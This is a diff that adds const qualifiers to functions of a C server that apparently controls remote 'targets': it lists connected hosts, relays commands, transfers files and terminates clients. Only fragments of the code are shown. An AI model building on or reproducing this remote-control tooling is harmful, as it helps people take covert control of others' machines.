@@ -149,7 +149,7 @@ int compare(const char* buf, const char* str) {
 }
 
 // Function to list all available connections.
-void list_connections(Conn_array* conns) {
+void list_connections(const Conn_array* conns) {
 	printf("\n\n---------------------------\n");
 	printf("---  C0NNECTED TARGETS  ---\n");
 	printf("--     Hostname: ID      --\n");
@@ -166,7 +166,7 @@ void list_connections(Conn_array* conns) {
 }
 
 // Function to receive file from target machine (TCP file transfer).
-int send_file(char* const buf, size_t cmd_len, SOCKET client_socket) {
+int send_file(char* const buf, const size_t cmd_len, SOCKET client_socket) {
 	// Send command to the client to be parsed.
 	buf[7] = '3';
 	if (send(client_socket, &buf[7], cmd_len, 0) < 1)
@@ -222,7 +222,7 @@ inline uint32_t ntohl_conv(char* const buf) {
 }
 
 // Function to receive file from target machine (TCP file transfer).
-int recv_file(char* const buf, size_t cmd_len, SOCKET client_socket) {
+int recv_file(char* const buf, const size_t cmd_len, SOCKET client_socket) {
 	// Send command to the client to be parsed.
 	buf[9] = '4';
 	if (send(client_socket, &buf[9], cmd_len, 0) < 1)
@@ -251,7 +251,7 @@ int recv_file(char* const buf, size_t cmd_len, SOCKET client_socket) {
 }
 
 // Function send change directory command to client.
-int client_cd(char* const buf, size_t cmd_len, SOCKET client_socket) {
+int client_cd(char* const buf, const size_t cmd_len, SOCKET client_socket) {
 	buf[3] = '1';
 	if (send(client_socket, &buf[3], cmd_len, 0) < 1)
 		return SOCKET_ERROR;
@@ -260,7 +260,7 @@ int client_cd(char* const buf, size_t cmd_len, SOCKET client_socket) {
 }
 
 // Function to terminate/kill client.
-int terminate_client(char* const buf, size_t cmd_len, SOCKET client_socket) {
+int terminate_client(char* const buf, const size_t cmd_len, SOCKET client_socket) {
 	send(client_socket, "2", cmd_len, 0);
 
 	return 0;
@@ -283,7 +283,7 @@ func parse_cmd(char* const buf) {
 }
 
 // Function to send command to client.
-int send_cmd(char* const buf, size_t cmd_len, SOCKET client_socket) {
+int send_cmd(char* const buf, const size_t cmd_len, SOCKET client_socket) {
 	// Send command to server.
 	if (send(client_socket, buf, cmd_len, 0) < 1)
 		return SOCKET_ERROR;
@@ -307,7 +307,7 @@ int send_cmd(char* const buf, size_t cmd_len, SOCKET client_socket) {
 }
 
 // Function to resize conns array/remove connection.
-void resize_conns(Conn_array* conns, int client_id) {
+void resize_conns(Conn_array* conns, const int client_id) {
 	for (size_t i = client_id; i < conns->size; i++) {
 		conns->clients[i].sock = conns->clients[i + 1].sock;
 		conns->clients[i].host = conns->clients[i + 1].host;
@@ -320,7 +320,7 @@ void resize_conns(Conn_array* conns, int client_id) {
 }
 
 // Function to parse interactive input and send to specified client.
-void interact(Conn_array* conns, char* const buf, int client_id) {
+void interact(Conn_array* conns, char* const buf, const int client_id) {
 	SOCKET client_socket = conns->clients[client_id].sock;
 	char* client_host = conns->clients[client_id].host;
 
